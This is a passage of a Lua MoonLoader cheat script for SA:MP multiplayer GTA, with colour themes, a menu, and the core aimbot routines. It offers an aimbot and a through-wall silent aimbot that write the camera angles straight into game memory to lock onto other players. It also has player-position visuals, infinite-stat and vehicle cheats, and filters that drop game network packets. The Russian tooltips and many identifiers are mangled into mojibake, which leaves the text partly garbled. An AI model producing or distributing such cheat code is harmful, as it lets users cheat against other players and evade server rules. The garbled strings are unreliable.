    colors[clr.SeparatorActive]        = ImVec4(0.10, 0.75, 0.63, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.26, 0.98, 0.85, 0.25)
    colors[clr.ResizeGripHovered]      = ImVec4(0.26, 0.98, 0.85, 0.67)
    colors[clr.ResizeGripActive]       = ImVec4(0.26, 0.98, 0.85, 0.95)
    colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.81, 0.35, 1.00)
    colors[clr.TextSelectedBg]         = ImVec4(0.26, 0.98, 0.85, 0.35)
    colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.ComboBg]                = colors[clr.PopupBg]
    colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
    colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
    colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function salat_style()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowRounding = 2.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.84)
    style.ChildWindowRounding = 2.0
    style.FrameRounding = 2.0
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0

    colors[clr.FrameBg]                = ImVec4(0.42, 0.48, 0.16, 0.54)
    colors[clr.FrameBgHovered]         = ImVec4(0.85, 0.98, 0.26, 0.40)
    colors[clr.FrameBgActive]          = ImVec4(0.85, 0.98, 0.26, 0.67)
    colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
    colors[clr.TitleBgActive]          = ImVec4(0.42, 0.48, 0.16, 1.00)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
    colors[clr.CheckMark]              = ImVec4(0.85, 0.98, 0.26, 1.00)
    colors[clr.SliderGrab]             = ImVec4(0.77, 0.88, 0.24, 1.00)
    colors[clr.SliderGrabActive]       = ImVec4(0.85, 0.98, 0.26, 1.00)
    colors[clr.Button]                 = ImVec4(0.85, 0.98, 0.26, 0.40)
    colors[clr.ButtonHovered]          = ImVec4(0.85, 0.98, 0.26, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.82, 0.98, 0.06, 1.00)
    colors[clr.Header]                 = ImVec4(0.85, 0.98, 0.26, 0.31)
    colors[clr.HeaderHovered]          = ImVec4(0.85, 0.98, 0.26, 0.80)
    colors[clr.HeaderActive]           = ImVec4(0.85, 0.98, 0.26, 1.00)
    colors[clr.Separator]              = colors[clr.Border]
    colors[clr.SeparatorHovered]       = ImVec4(0.63, 0.75, 0.10, 0.78)
    colors[clr.SeparatorActive]        = ImVec4(0.63, 0.75, 0.10, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.85, 0.98, 0.26, 0.25)
    colors[clr.ResizeGripHovered]      = ImVec4(0.85, 0.98, 0.26, 0.67)
    colors[clr.ResizeGripActive]       = ImVec4(0.85, 0.98, 0.26, 0.95)
    colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.81, 0.35, 1.00)
    colors[clr.TextSelectedBg]         = ImVec4(0.85, 0.98, 0.26, 0.35)
    colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.ComboBg]                = colors[clr.PopupBg]
    colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
    colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
    colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function imgui.Style()
    if gui.îthår.style.v == 0 then
        blue_style()
    elseif gui.îthår.style.v == 1 then
        red_style()
    elseif gui.îthår.style.v == 2 then
        brown_style()
    elseif gui.îthår.style.v == 3 then
        golub_style()
    elseif gui.îthår.style.v == 4 then
        salat_style()
    end
end

local fa_font = nil
local fa_glyph_ranges = imgui.ImGlyphRanges({ fa.min_range, fa.max_range })
function imgui.BeforeDrawFrame()
    if fa_font == nil then
        local font_config = imgui.ImFontConfig()
        font_config.MergeMode = true

        fa_font = imgui.GetIO().Fonts:AddFontFromFileTTF('moonloader/resource/fonts/fa-solid-900.ttf', 13.0, font_config, fa_glyph_ranges)
    end
end

function imgui.OnDrawFrame()
    if mainWindowState.v then
        imgui.SetNextWindowPos(imgui.ImVec2(posX / 2, posY / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.SetNextWindowSize(imgui.ImVec2(730, 270), imgui.Cond.FirstUseEver)
        imgui.Begin(u8 "INVISIÂLÅ ÑÍÅÀÒ v1.0", mainWindowState, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)

        imgui.BeginChild("##buttons", imgui.ImVec2(150, -1), true)
            if imgui.Button(fa.ICON_FA_CROSSHAIRS .. u8 " Smîîth àimbît", imgui.ImVec2(-1, 40)) then
                menu = 1
            end

            if imgui.Button(fa.ICON_FA_SKULL .. u8 " Silånt àimbît", imgui.ImVec2(-1, 40)) then
                menu = 2
            end

            if imgui.Button(fa.ICON_FA_USERS_COG .. u8 " Visuàl såttings", imgui.ImVec2(-1, 40)) then
                menu = 3
            end

            if imgui.Button(fa.ICON_FA_COGS .. u8 " Ìisñ såttings", imgui.ImVec2(-1, 40)) then
                menu = 4
            end

            if imgui.Button(fa.ICON_FA_BARS .. u8 " Îhhår såttings", imgui.ImVec2(-1, 40)) then
                menu = 5
            end
        imgui.EndChild()

        imgui.SameLine()

        imgui.BeginChild("##main", imgui.ImVec2(400, -1), true, imgui.WindowFlags.NoScrollbar)
            if menu == 1 then
                if imgui.Checkbox(u8 "Ånàblå", gui.smuth.en) then
                    cfg.smuth.en = gui.smuth.en.v
                    save()
                end
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "VisiblåÑhåñk", gui.smuth.vc) then
                    cfg.smuth.vc = gui.smuth.vc.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü ÷åðåç çäàíèÿ, ìàøèíû, îáúåêòû")

                if imgui.Checkbox(u8 "ÎnF³rå", gui.smuth.of) then
                    cfg.smuth.of = gui.smuth.of.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò áóäåò ðàáîòàòü òîëüêî ïðè íàæàòèè ËÊÌ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "DónàmiñSmîîth", gui.smuth.ds) then
                    cfg.smuth.ds = gui.smuth.ds.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò î÷åíü íàâîäêó ñ îäèíàêîâîé ñêîðîñòüþ")

                if imgui.Checkbox(u8 "IgnîråStun", gui.smuth.is) then
                    cfg.smuth.is = gui.smuth.is.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü â àíèìàöèè ñòàíà")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "ÑhåñkÌîdål", gui.smuth.cm) then
                    cfg.smuth.cm = gui.smuth.cm.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà ñêèí, êàê ó âàñ")

                if imgui.Checkbox(u8 "ÑhåñkF³iltår", gui.smuth.cf) then
                    cfg.smuth.cf = gui.smuth.cf.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà êëèñò, êàê ó âàñ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "ÑhåñkÀfk", gui.smuth.ca) then
                    cfg.smuth.ca = gui.smuth.ca.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà èãðîêà, êîòîðûé â AFK")

                if imgui.SliderFloat(u8 "Ràdius", gui.smuth.ra, 1.0, 180.0, "%.1f") then
                    cfg.smuth.ra = gui.smuth.ra.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðàäèóñ ðàáîòû àèìáîòà")

                if imgui.SliderFloat(u8 "Smîîth", gui.smuth.sm, 1.0, 25.0, "%.1f") then
                    cfg.smuth.sm = gui.smuth.sm.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïëàâíîñòü íàâîäêè àèìáîòà")

                if imgui.SliderFloat(u8 "SuðårSmîîth", gui.smuth.ss, 1.0, 25.0, "%.1f") then
                    cfg.smuth.ss = gui.smuth.ss.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïëàâíîñòü, óìíîæåííàÿ íà äâà")
            end

            if menu == 2 then
                if imgui.Checkbox(u8 "Ånàblå", gui.silånt.en) then
                    cfg.silånt.en = gui.silånt.en.v
                    save()
                end
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "ÑhåñkÌîdål", gui.silånt.cm) then
                    cfg.silånt.cm = gui.silånt.cm.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà ñêèí, êàê ó âàñ")

                if imgui.Checkbox(u8 "WàllShît", gui.silånt.ws) then
                    cfg.silånt.ws = gui.silånt.ws.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò áóäåò ðàáîòàòü ÷åðåç ñòåíû, îáúåêòû, ìàøèíû")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "ÑhåñkDåàd", gui.silånt.cd) then
                    cfg.silånt.cd = gui.silånt.cd.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà èãðîêîâ, êîòîðûå óìåðëè")

                if imgui.Checkbox(u8 "ÑhåñkFiltår", gui.silånt.cf) then
                    cfg.silånt.cf = gui.silånt.cf.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà êëèñò, êàê ó âàñ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "ÑhåckCàr", gui.silånt.cc) then
                    cfg.silånt.cc = gui.silånt.cc.v
                    save()
                end
                imgui.TextQuestion(u8 "Àèìáîò íå áóäåò ðàáîòàòü íà èãðîêîâ, êîòîðûå íàõîäÿòñÿ â ìàøèíå")

                if imgui.SliderFloat(u8 "Ràdius", gui.silånt.ra, 1.0, 180.0, "%.1f") then
                    cfg.silånt.ra = gui.silånt.ra.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðàäèóñ ðàáîòû àèìáîòà")

                if imgui.SliderFloat(u8 "Distànñå", gui.silånt.ds, 1.0, 180.0, "%.1f") then
                    cfg.silånt.ds = gui.silånt.ds.v
                    save()
                end
                imgui.TextQuestion(u8 "Äèñòàíöèÿ ñðàáàòûâàíèÿ àèìáîòà")

                if imgui.SliderInt(u8 "Hit Ñhànñå", gui.silånt.hc, 0, 100) then
                    cfg.silånt.hc = gui.silånt.hc.v
                    save()
                end
                imgui.TextQuestion(u8 "Øàíñ ïîïîäàíèÿ â ïðîöåíòàõ")
            end

            if menu == 3 then
                if imgui.Checkbox(u8 "DràwFÎV", gui.visuàl.drf) then
                    cfg.visuàl.drf = gui.visuàl.drf.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïîêàçûâàåò ðàäèóñ àèìáîòà (íóæíî âêëþ÷èòü õîòÿ áû îäèí)")

                if imgui.Checkbox(u8 "Âînås", gui.visuàl.bn) then
                    cfg.visuàl.bn = gui.visuàl.bn.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðèñóåò êîñòè èãðîêîâ")

                if imgui.Checkbox(u8 "Âîõ", gui.visuàl.bx) then
                    cfg.visuàl.bx = gui.visuàl.bx.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðèñóåò áîêñû èãðîêàì")

                if imgui.Checkbox(u8 "Linås", gui.visuàl.ln) then
                    cfg.visuàl.ln = gui.visuàl.ln.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðèñóåò ëèíèè ê èãðîêàì")

                --[[if imgui.Checkbox(u8 "NàmåTàgs", gui.visuàl.nt) then
                    cfg.visuàl.nt = gui.visuàl.nt.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðèñóåò íèêè èãðîêîâ íà áîëüøîé äèñòàíöèè è ÷åðåç ñòåíû")]]
            end

            if menu == 4 then
                if imgui.Checkbox(u8 "Ñlåàr Ànim [X]", gui.misñ.ca) then
                    cfg.misñ.ca = gui.misñ.ca.v
                    save()
                end
                imgui.TextQuestion(u8 "Ñáèâ ëþáîé àíèìàöèè íà X")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "²nf³n³tyRun", gui.misñ.ir) then
                    cfg.misñ.ir = gui.misñ.ir.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò áåñêîíå÷íûé áåã")

                if imgui.Checkbox(u8 "ÀntiStun", gui.misñ.as) then
                    cfg.misñ.as = gui.misñ.as.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò àíèìàöèþ ñòàíà")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "²nf³n³tyÎõygån", gui.misñ.io) then
                    cfg.misñ.io = gui.misñ.io.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò áåñêîíå÷íûé êèñëîðîä")

                if imgui.Checkbox(u8 "NîÑàmRåstîrå", gui.misñ.ncr) then
                    cfg.misñ.ncr = gui.misñ.ncr.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò öåíòðèðîâàíèå êàìåðû ïðè ñòðåëüáå")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "SðåàdÍàñk [ALT]", gui.misñ.sh) then
                    cfg.misñ.sh = gui.misñ.sh.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò áûñòðûé ðàçãîí Ò/C")

                if imgui.Checkbox(u8 "NîFàll", gui.misñ.nf) then
                    cfg.misñ.nf = gui.misñ.nf.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò àíèìàöèþ ïàäåíèÿ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "Drive", gui.misñ.dr) then
                    cfg.misñ.dr = gui.misñ.dr.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò âîçìîæíîñòü åçäèòü ïîä âîäîé (íå ãëóøèò äâèãàòåëü)")

                if imgui.Checkbox(u8 "ShîwÑrîsshà³rInstàntly", gui.misñ.scr) then
                    cfg.misñ.scr = gui.misñ.scr.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò áûñòðûé ïðèöåë")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "JumðÂÌÕ", gui.misñ.jb) then
                    cfg.misñ.jb = gui.misñ.jb.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò âûñîêèé ïðèæîê íà âåëîñèïåäå")

                if imgui.Checkbox(u8 "NîRålîàd", gui.misñ.nr) then
                    cfg.misñ.nr = gui.misñ.nr.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò ïåðåçàðÿäêó îðóæèÿ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "ÂikåNîFàll", gui.misñ.bf) then
                    cfg.misñ.bf = gui.misñ.bf.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò ïàäåíèå ñ âåëîñèïåäà")

                if imgui.Checkbox(u8 "FàstÅxit [F]", gui.misñ.fe) then
                    cfg.misñ.fe = gui.misñ.fe.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò áûñòðûé âûõîä èç ìàøèíû íà F")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "SðringÂîàrd [C]", gui.misñ.spb) then
                    cfg.misñ.spb = gui.misñ.spb.v
                    save()
                end
                imgui.TextQuestion(u8 "Ñîçäàåò òàìïëèí ïîä ìàøèíîé")

                if imgui.Checkbox(u8 "Àutî +Ñ [R]", gui.misñ.atc) then
                    cfg.misñ.atc = gui.misñ.atc.v
                    save()
                end
                imgui.TextQuestion(u8 "Âêëþ÷àåò àâòîìàòè÷åñêèé áàã +C íà R")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "WhåålGÌ", gui.misñ.weg) then
                    cfg.misñ.weg = gui.misñ.weg.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò ïðîáèòèå êîëåñ íà âàøåé ìàøèíå")

                imgui.SetCursorPosX(400 / 2 - 200 / 2)
                if imgui.Button(fa.ICON_FA_FORWARD, imgui.ImVec2(200, 21)) then
                    lua_thread.create(function()
                        wait(0)
                        menu = 42
                    end)
                end
            end

            if menu == 42 then
                if imgui.Checkbox(u8 "ÀntiJàmÌîtîr", gui.misñ.ajm) then
                    cfg.misñ.ajm = gui.misñ.ajm.v
                    save()
                end
                imgui.TextQuestion(u8 "Èñïðàâëÿåò ôè÷ó ñåðâåðîâ, ñâÿçàííóþ ñ íàíåñåíèåì óðîíà àâòîìîáèëþ, êîãäà äâèãàòåëü ãëóøèòñÿ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "FliðÑàr [DELETE]", gui.misñ.fc) then
                    cfg.misñ.fc = gui.misñ.fc.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïåðåâîðà÷èâàåò ìàøèíó")

                if imgui.Checkbox(u8 "ÍódraulÌîde", gui.misñ.hm) then
                    cfg.misñ.hm = gui.misñ.hm.v
                    save()
                end
                imgui.TextQuestion(u8 "Óñòàíàâëèâàåò âàøåìó àâòîìîáèëþ ãèäðàâëèêó")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "Reversal 180 [BACKSPACE]", gui.misñ.r180) then
                    cfg.misñ.r180 = gui.misñ.r180.v
                    save()
                end
                imgui.TextQuestion(u8 "Ðàçâîðà÷èâàåò àâòîìîáèëü íà 180 ãðàäóñîâ")

                if imgui.Checkbox(u8 "ÂóåFuål", gui.misñ.bf) then
                    cfg.misñ.bf = gui.misñ.bf.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïîçâîëÿåò âàì çàáûòü î çàïðàâêå âàøåãî àâòîìîáèëÿ")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "SðrintÍîîk [SPACE]", gui.misñ.sph) then
                    cfg.misñ.sph = gui.misñ.sph.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïîçâîëÿåò áûñòðî áåãàòü")
                
                if imgui.Checkbox(u8 "JumðÑàr [B]", gui.misñ.jc) then
                    cfg.misñ.jc = gui.misñ.jc.v
                    save()
                end
                imgui.TextQuestion(u8 "Ïîçâîëÿåò ïîäïðûãíóòü íà àâòîìîáèëå")
                imgui.SameLine(250)
                if imgui.Checkbox(u8 "FÐSUnlîñk", gui.misñ.fu) then
                    cfg.misñ.fu = gui.misñ.fu.v
                    save()
                end
                imgui.TextQuestion(u8 "Îòêëþ÷àåò îãðàíè÷èòåëü FÐS")

                if imgui.Checkbox(u8 "ÒànkÌîde", gui.misñ.tm) then
                    cfg.misñ.tm = gui.misñ.tm.v
                    save()
                end
                imgui.TextQuestion(u8 "Õîðîøàÿ øòó÷êà äëÿ òàðàíà")
                
                if imgui.Checkbox(u8 "ExplosionInvert", gui.misñ.ei) then
                    cfg.misñ.ei = gui.misñ.ei.v
                    save()
                end
                imgui.TextQuestion(u8 "ôóíêöèÿ, áëàãîäàðÿ êîòîðîé âàø àâòîìîáèëü ïðè ïåðåâîðîòå íå âçîðâ¸òñÿ")

                if imgui.Checkbox(u8 "ÑutÂràkå  [J]", gui.misñ.cb) then
                    cfg.misñ.cb = gui.misñ.cb.v
                    save()
                end
                imgui.TextQuestion(u8 "ôóíêöèÿ äëÿ áûñòðîãî òîðìîæåíèÿ àâòîìîáèëÿ")

                if imgui.Checkbox(u8 "RidÎnWàtår", gui.misñ.row) then
                    cfg.misñ.row = gui.misñ.row.v
                    save()
                end
                imgui.TextQuestion(u8 "Åçäà àâòîìîáèëÿ ïî âîäå")

                imgui.SetCursorPosX(400 / 2 - 200 / 2)
                if imgui.Button(fa.ICON_FA_BACKWARD, imgui.ImVec2(200, 21)) then
                    lua_thread.create(function()
                        wait(0)
                        menu = 4
                    end)
                end
            end
            if menu == 5 then
                if imgui.Combo(u8 "Style menu", gui.îthår.style, theme_style) then
                    imgui.Style()
                    cfg.îthår.style = gui.îthår.style.v
                    save()
                end

                if imgui.Button(u8 "Unlîàd Sñriðt", imgui.ImVec2(-1, 30)) then
                    unlîàd()
                end

                if imgui.Button(u8 "Rålîàd Sñriðt", imgui.ImVec2(-1, 30)) then
                    reloadScripts()
                end

                if imgui.Button(u8 "Råmîvå Sñriðt", imgui.ImVec2(-1, 30)) then
                    råmîvå()
                end
            end

            if menu == 6 then
                imgui.BeginChild("##buttons-nops", imgui.ImVec2(-1, 70), true)
                if imgui.Button(u8 "Incoming RPC", imgui.ImVec2(119, 25)) then
                    currentDrawingMenu = 1
                end

                imgui.SameLine()

                if imgui.Button(u8 "Outcoming RPC", imgui.ImVec2(119, 25)) then
                    currentDrawingMenu = 2
                end

                imgui.SameLine()

                if imgui.Button(u8 "Incoming Packets", imgui.ImVec2(119, 25)) then
                    currentDrawingMenu = 3
                end

                if imgui.Button(u8 "Outcoming Packets", imgui.ImVec2(367, 25)) then
                    currentDrawingMenu = 4
                end
                imgui.EndChild()

                render_filter(1, filter_rpc_incoming, filter_in_filter)
                render_filter(2, filter_rpc_outcoming, filter_in_filter)
                render_filter(3, filter_packets_incoming, filter_in_filter)
                render_filter(4, filter_packets_outcoming, filter_in_filter)
            end
        imgui.EndChild()

        imgui.SameLine()

        imgui.BeginChild("##button2", imgui.ImVec2(150, -1), true)
            if imgui.Button(fa.ICON_FA_TIMES_CIRCLE .. u8 " NÎÐ såttings", imgui.ImVec2(-1, 40)) then
                menu = 6
            end

            if imgui.Button(fa.ICON_FA_KEYBOARD .. u8 " Âindår", imgui.ImVec2(-1, 40)) then
            end
        imgui.EndChild()

        imgui.End()
    end
end

-- SMÎÎTH
function smuth()
    if gui.smuth.en.v and isKeyDown(VK_RBUTTON) then
        if not gui.smuth.of.v or (gui.smuth.of.v and isKeyDown(VK_LBUTTON)) then
            local playerID = gåtNåàråstÐåd()
            if playerID ~= -1 then
                local _, pedID = sampGetPlayerIdByCharHandle(PLAYER_PED)
                local _, handle = sampGetCharHandleBySampPlayerId(playerID)
                if (gui.smuth.is.v and not ñhåñkStunåd()) then return false end
                if (gui.smuth.cf.v and sampGetPlayerColor(pedID) == sampGetPlayerColor(playerID)) then return false end
                if (gui.smuth.ca.v and sampIsPlayerPaused(playerID)) then return false end
                local myPos = {getActiveCameraCoordinates()}
                local enPos = {gåtÂîdóÐàrtÑîîrdinàtås(gåtNåàråstÂînå(handle), handle)}
                if not gui.smuth.vc.v or (gui.smuth.vc.v and isLineOfSightClear(myPos[1], myPos[2], myPos[3], enPos[1], enPos[2], enPos[3], true, true, false, true, true)) then
                    local pedWeapon = getCurrentCharWeapon(PLAYER_PED)
                    if pedWeapon ~= 0 then
                        if (pedWeapon >= 22 and pedWeapon <= 29) or pedWeapon == 32 then
                            coefficent = 0.04253
                        elseif pedWeapon == 30 or pedWeapon == 31 then
                            coefficent = 0.028
                        elseif pedWeapon == 33 then
                            coefficent = 0.01897
                        end
                        local vector = {myPos[1] - enPos[1], myPos[2] - enPos[2]}
                        local angle = math.acos(vector[1] / math.sqrt((math.pow(vector[1], 2) + math.pow(vector[2], 2))))
                        local view = {fiõ(representIntAsFloat(readMemory(0xB6F258, 4, false))), fiõ(representIntAsFloat(readMemory(0xB6F248, 4, false)))}
                        if (vector[1] <= 0.0 and vector[2] >= 0.0) or (vector[1] >= 0.0 and vector[2] >= 0.0) then
                            dif = (angle + coefficent) - view[1]
                        end
                        if (vector[1] >= 0.0 and vector[2] <= 0.0) or (vector[1] <= 0.0 and vector[2] <= 0.0) then
                            dif = (-angle + coefficent) - view[1]
                        end
                        if gui.smuth.ds.v then multiplier = 5 else multiplier = 1 end
                        local smuth = dif / ((gui.smuth.sm.v * multiplier) * gui.smuth.ss.v)
                        if gui.smuth.ds.v then
                            if smuth > 0.0 then
                                if smuth < làstsmîîth then
                                    smuth = smuth * (làstsmîîth / smuth)
                                end
                            else 
                                if -smuth < -làstsmîîth then
                                    smuth = smuth * (-làstsmîîth / -smuth)
                                end
                            end
                            làstsmîîth = smuth
                        end
                        if smuth > -1.0 and smuth < 0.5 and dif > -2.0 and dif < 2.0 then
                            view[1] = view[1] + smuth
                            setCameraPositionFixed(view[2], view[1])
                        end
                    end
                end
            end
        end
    end
    return false
end

function setCameraPositionFixed(zAngle, xAngle) 
    writeMemory(0xB6F258, 4, representFloatAsInt(xAngle), true)
    writeMemory(0xB6F248, 4, representFloatAsInt(zAngle), true)
end

function fpsCorrection()
	return representIntAsFloat(readMemory(0xB7CB5C, 4, false))
end

function fiõ(angle)
    if angle > math.pi then
        angle = angle - (math.pi * 2)
    elseif angle < -math.pi then 
        angle = angle + (math.pi * 2) 
    end
    return angle
end

function gåtNåàråstÐåd()
    local maxDistance = 20000
    local nearestPED = -1
    for i = 0, sampGetMaxPlayerId(true) do
        if sampIsPlayerConnected(i) then
            local find, handle = sampGetCharHandleBySampPlayerId(i)
            if find then
                if isCharOnScreen(handle) then
                    if not isCharDead(handle) then
                        local crosshairPos = {convertGameScreenCoordsToWindowScreenCoords(339.1, 179.1)}
                        local enPos = {gåtÂîdóÐàrtÑîîrdinàtås(gåtNåàråstÂînå(handle), handle)}
                        local bonePos = {convert3DCoordsToScreen(enPos[1], enPos[2], enPos[3])}
                        local distance = math.sqrt((math.pow((bonePos[1] - crosshairPos[1]), 2) + math.pow((bonePos[2] - crosshairPos[2]), 2)))
                        if distance > (gui.smuth.ra.v * 10) then check = true else check = false end 
                        if not check then
                            local myPos = {getCharCoordinates(PLAYER_PED)}
                            local enPos = {getCharCoordinates(handle)}
                            local distance = math.sqrt((math.pow((enPos[1] - myPos[1]), 2) + math.pow((enPos[2] - myPos[2]), 2) + math.pow((enPos[3] - myPos[3]), 2)))
                            if (distance < maxDistance) then
                                nearestPED = i
                                maxDistance = distance
                            end
                        end
                    end
                end
            end
        end
    end
    return nearestPED
end

function ñhåñkStunåd()
	for k, v in pairs(ànims) do
		if isCharPlayingAnim(PLAYER_PED, v) then
			return false
		end
	end
	return true
end

function gåtNåàråstÂînå(handle)
    local maxDist = 20000    
    local NåàråstÂînå = -1
    bone = {42, 52, 23, 33, 3, 22, 32, 8}
    for n = 1, 8 do
        local crosshairPos = {convertGameScreenCoordsToWindowScreenCoords(339.1, 179.1)}
        local bonePos = {gåtÂîdóÐàrtÑîîrdinàtås(bone[n], handle)}
        local enPos = {convert3DCoordsToScreen(bonePos[1], bonePos[2], bonePos[3])}
        local distance = math.sqrt((math.pow((enPos[1] - crosshairPos[1]), 2) + math.pow((enPos[2] - crosshairPos[2]), 2)))
        if (distance < maxDist) then
            NåàråstÂînå = bone[n]
            maxDist = distance
        end 
    end
    return NåàråstÂînå
end

function gåtÂîdóÐàrtÑîîrdinàtås(id, handle)
    if doesCharExist(handle) then
        local pedptr = getCharPointer(handle)
        local vec = ffi.new("float[3]")
